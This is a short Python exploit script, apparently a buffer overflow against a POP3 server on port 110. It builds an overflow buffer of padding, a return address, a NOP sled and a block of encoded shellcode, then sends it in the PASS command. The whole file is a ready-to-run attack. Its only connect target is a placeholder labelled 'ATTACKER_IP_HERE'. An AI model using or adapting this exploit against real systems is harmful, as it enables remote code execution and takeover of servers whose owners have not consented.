#! /usr/bin/python3

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Shellcode to be executed on the vulnerable server
shellcode = (b"\xb8\xca\xba\xbf\x97\xdb\xd0\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
             b"\x52\x83\xc3\x04\x31\x43\x0e\x03\x89\xb4\x5d\x62\xf1\x21\x23"
             b"\x8d\x09\xb2\x44\x07\xec\x83\x44\x73\x65\xb3\x74\xf7\x2b\x38"
             b"\xfe\x55\xdf\xcb\x72\x72\xd0\x7c\x38\xa4\xdf\x7d\x11\x94\x7e"
             b"\xfe\x68\xc9\xa0\x3f\xa3\x1c\xa1\x78\xde\xed\xf3\xd1\x94\x40"
             b"\xe3\x56\xe0\x58\x88\x25\xe4\xd8\x6d\xfd\x07\xc8\x20\x75\x5e"
             b"\xca\xc3\x5a\xea\x43\xdb\xbf\xd7\x1a\x50\x0b\xa3\x9c\xb0\x45"
             b"\x4c\x32\xfd\x69\xbf\x4a\x3a\x4d\x20\x39\x32\xad\xdd\x3a\x81"
             b"\xcf\x39\xce\x11\x77\xc9\x68\xfd\x89\x1e\xee\x76\x85\xeb\x64"
             b"\xd0\x8a\xea\xa9\x6b\xb6\x67\x4c\xbb\x3e\x33\x6b\x1f\x1a\xe7"
             b"\x12\x06\xc6\x46\x2a\x58\xa9\x37\x8e\x13\x44\x23\xa3\x7e\x01"
             b"\x80\x8e\x80\xd1\x8e\x99\xf3\xe3\x11\x32\x9b\x4f\xd9\x9c\x5c"
             b"\xaf\xf0\x59\xf2\x4e\xfb\x99\xdb\x94\xaf\xc9\x73\x3c\xd0\x81"
             b"\x83\xc1\x05\x05\xd3\x6d\xf6\xe6\x83\xcd\xa6\x8e\xc9\xc1\x99"
             b"\xaf\xf2\x0b\xb2\x5a\x09\xdc\xb7\x91\x11\x91\xa0\xa7\x11\xa8"
             b"\x8b\x21\xf7\xc0\xfb\x67\xa0\x7c\x65\x22\x3a\x1c\x6a\xf8\x47"
             b"\x1e\xe0\x0f\xb8\xd1\x01\x65\xaa\x86\xe1\x30\x90\x01\xfd\xee"
             b"\xbc\xce\x6c\x75\x3c\x98\x8c\x22\x6b\xcd\x63\x3b\xf9\xe3\xda"
             b"\x95\x1f\xfe\xbb\xde\x9b\x25\x78\xe0\x22\xab\xc4\xc6\x34\x75"
             b"\xc4\x42\x60\x29\x93\x1c\xde\x8f\x4d\xef\x88\x59\x21\xb9\x5c"
             b"\x1f\x09\x7a\x1a\x20\x44\x0c\xc2\x91\x31\x49\xfd\x1e\xd6\x5d"
             b"\x86\x42\x46\xa1\x5d\xc7\x66\x40\x77\x32\x0f\xdd\x12\xff\x52"
             b"\xde\xc9\x3c\x6b\x5d\xfb\xbc\x88\x7d\x8e\xb9\xd5\x39\x63\xb0"
             b"\x46\xac\x83\x67\x66\xe5")

# Creating the buffer
buffer = b"A"*2607 + b"\x8f\x35\x4a\x5f" + b"\x90"*8 + shellcode

try:
    print("\nSending evil buffer...")
    s.connect(('ATTACKER_IP_HERE', 110)) 
    data = s.recv(1024)
    s.send(b'USER username' + b'\r\n')
    data = s.recv(1024)
    s.send(b'PASS ' + buffer + b'\r\n')
    print("\nDone!")
except Exception as e:
    print("Cannot connect to pop3! Error:", e)
